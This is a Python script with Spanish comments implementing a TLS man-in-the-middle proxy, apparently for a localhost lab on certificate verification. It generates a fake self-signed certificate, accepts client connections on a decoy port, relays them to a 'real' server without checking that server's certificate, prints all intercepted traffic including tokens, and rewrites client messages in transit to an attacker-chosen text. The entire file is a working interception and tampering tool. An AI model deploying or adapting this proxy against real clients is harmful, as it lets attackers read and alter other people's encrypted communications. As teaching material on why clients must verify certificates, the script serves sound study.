import socket
import ssl
import threading
import subprocess
import os

# -----------------------------
# CONFIGURACIÓN DEL ATACANTE
# -----------------------------
PUERTO_FALSO = 3444   # El cliente se conecta aquí (engañado)
HOST_REAL    = "127.0.0.1"
PUERTO_REAL  = 3443   # Servidor legítimo

MITM_CERT = "mitm_cert.pem"
MITM_KEY  = "mitm_key.pem"

# -----------------------------
# GENERACIÓN DEL CERTIFICADO MITM
# -----------------------------
def generar_cert_mitm():
    if not os.path.exists(MITM_CERT) or not os.path.exists(MITM_KEY):
        print("[*] Generando certificado MitM falso...")
        subprocess.run([
            "openssl", "req", "-x509", "-newkey", "rsa:2048",
            "-keyout", MITM_KEY, "-out", MITM_CERT,
            "-days", "365", "-nodes",
            "-subj", "/CN=localhost-mitm"
        ], check=True)
        print("[*] Certificado MitM generado.")

# -----------------------------
# REENVÍO E INTERCEPTACIÓN
# -----------------------------
def reenviar_datos(origen, destino, direccion):
    while True:
        try:
            datos = origen.recv(4096)
            if not datos:
                break

            mensaje = datos.decode('utf-8', errors='ignore')

            if direccion == "CLIENTE -> SERVIDOR":
                print(f"\n[+] Interceptado ({direccion}): {mensaje}")

                # ======================================================
                # ZONA DE ATAQUE: MAN-IN-THE-MIDDLE
                # Modificamos el texto del mensaje al vuelo
                # ======================================================
                if mensaje.startswith("MENSAJE:"):
                    partes = mensaje.split(":", 2)  # MENSAJE:token:texto
                    if len(partes) == 3:
                        partes[2] = "MENSAJE MANIPULADO POR EL ATACANTE"
                        datos = ":".join(partes).encode()
                        print(f"[!] Mensaje modificado: {datos.decode()}")

            else:
                print(f"\n[-] Interceptado ({direccion}): {mensaje}")

            destino.sendall(datos)

        except Exception:
            print(f"[x] Conexión cerrada en {direccion}")
            break

def manejar_conexion(cliente_ssl):
    # Conectar al servidor real con SSL (sin verificar su certificado)
    ctx_salida = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx_salida.check_hostname = False
    ctx_salida.verify_mode = ssl.CERT_NONE

    try:
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        servidor_ssl = ctx_salida.wrap_socket(raw, server_hostname=HOST_REAL)
        servidor_ssl.connect((HOST_REAL, PUERTO_REAL))
    except Exception:
        print("[x] No se pudo conectar al servidor real.")
        cliente_ssl.close()
        return

    threading.Thread(target=reenviar_datos, args=(cliente_ssl, servidor_ssl, "CLIENTE -> SERVIDOR"), daemon=True).start()
    threading.Thread(target=reenviar_datos, args=(servidor_ssl, cliente_ssl, "SERVIDOR -> CLIENTE"), daemon=True).start()

# -----------------------------
# INICIO DEL PROXY
# -----------------------------
def iniciar_proxy():
    generar_cert_mitm()

    # El proxy presenta su propio certificado falso al cliente
    ctx_entrada = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx_entrada.load_cert_chain(certfile=MITM_CERT, keyfile=MITM_KEY)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proxy:
        proxy.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        proxy.bind(("127.0.0.1", PUERTO_FALSO))
        proxy.listen(5)
        proxy.settimeout(1.0)
        print(f"[*] PROXY MitM SSL escuchando en el puerto {PUERTO_FALSO}")
        print(f"[*] Redirigiendo al servidor real en {PUERTO_REAL}")
        print(f"[*] El ataque funciona porque el cliente tiene CERT_NONE (no verifica certificado)")

        while True:
            try:
                conn, addr = proxy.accept()
                ssl_conn = ctx_entrada.wrap_socket(conn, server_side=True)
                print(f"\n[*] Victima conectada desde {addr}")
                threading.Thread(target=manejar_conexion, args=(ssl_conn,), daemon=True).start()
            except socket.timeout:
                pass
            except KeyboardInterrupt:
                print("\n[!] Proxy apagado.")
                break

if __name__ == "__main__":
    iniciar_proxy()
